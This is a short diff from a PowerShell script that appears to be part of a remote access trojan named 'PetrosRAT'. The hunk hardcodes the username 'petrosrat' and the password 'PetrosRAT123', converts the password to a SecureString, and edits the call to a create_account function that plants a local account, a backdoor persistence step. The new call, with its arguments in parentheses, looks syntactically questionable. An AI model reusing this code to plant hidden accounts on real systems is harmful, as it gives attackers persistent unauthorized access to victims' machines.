@@ -29,7 +29,7 @@ function create_account {
 $uname = "petrosrat"
 $password = "PetrosRAT123"   # he uses random password with the function above  $password = random_text
 $pword = (ConvertTo-SecureString $password -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+create_account (-uname $uname -pword $pword)
 
 # variables
 $wd = random_text
